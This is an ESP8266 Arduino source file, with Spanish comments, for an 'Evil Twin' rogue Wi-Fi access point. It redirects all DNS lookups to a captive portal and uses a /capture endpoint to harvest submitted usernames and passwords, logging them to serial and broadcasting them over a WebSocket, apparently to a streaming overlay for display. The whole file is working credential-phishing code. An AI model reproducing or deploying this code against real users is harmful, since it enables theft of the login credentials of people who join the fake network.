#include <AsyncWebSocket.h>
#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <ESPAsyncWebServer.h>

#include "device_logger.h"
#include "obs_toast_html.h"
#include "portal_html.h"

extern "C" {
#include "user_interface.h"
}

const char *AP_SSID = "UNGS 100% Real No Fake";
const char *AP_PASS = "";
IPAddress apIP(192, 168, 4, 1);
const byte DNS_PORT = 53;

DNSServer dnsServer;
AsyncWebServer server(80);
AsyncWebSocket ws("/ws");

void setup() {
  Serial.begin(115200);
  Serial.println("\nConfigurando Evil Twin y Portal Cautivo...");

  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(AP_SSID, AP_PASS);
  Serial.print("Access Point \"");
  Serial.print(AP_SSID);
  Serial.println("\" iniciado.");
  Serial.print("IP del AP: ");
  Serial.println(WiFi.softAPIP());

  dnsServer.start(DNS_PORT, "*", apIP);
  Serial.println("Servidor DNS iniciado.");

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", HTML_PORTAL);
  });

  server.on("/obs-toast", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", HTML_TOAST_OBS);
  });

  server.on("/capture", HTTP_POST, [](AsyncWebServerRequest *request) {
    if (request->hasParam("user", true) && request->hasParam("pass", true)) {
      String user = request->getParam("user", true)->value();
      String pass = request->getParam("pass", true)->value();

      Serial.print("Credenciales Capturadas: User=");
      Serial.print(user);
      Serial.print(", Pass=");
      Serial.println(pass);

      ws.textAll("{\"user\":\"" + user + "\",\"pass\":\"" + pass + "\"}");

      request->send(200, "text/plain", "Credenciales recibidas!");
    } else {
      request->send(400, "text/plain", "Faltan datos de usuario o contraseña");
    }
  });

  server.on("/log", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(200, "text/html", getLogPre());
  });

  server.onNotFound([](AsyncWebServerRequest *request) {
    if (request->method() == HTTP_GET) {
      if (!request->host().equals(apIP.toString()) && !request->host().equals("192.168.4.1")) {
        request->redirect("http://" + apIP.toString());
        return;
      }
    }
    request->send(404, "text/plain", "Not Found");
  });

  ws.onEvent([](AsyncWebSocket *server, AsyncWebSocketClient *client, AwsEventType type, void *arg, uint8_t *data, size_t len) {
    if (type == WS_EVT_CONNECT) {
      Serial.printf("Cliente WebSocket conectado: %u\n", client->id());
    } else if (type == WS_EVT_DISCONNECT) {
      Serial.printf("Cliente WebSocket desconectado: %u\n", client->id());
    } // else if (type == WS_EVT_DATA)
  });
  server.addHandler(&ws);

  server.begin();
  Serial.println("Servidor HTTP iniciado.");
}

unsigned long lastDeviceCheck = 0;
void loop() {
  dnsServer.processNextRequest();

  if (millis() - lastDeviceCheck > 5000) {
    lastDeviceCheck = millis();
    checkConnectedDevices();
  }
}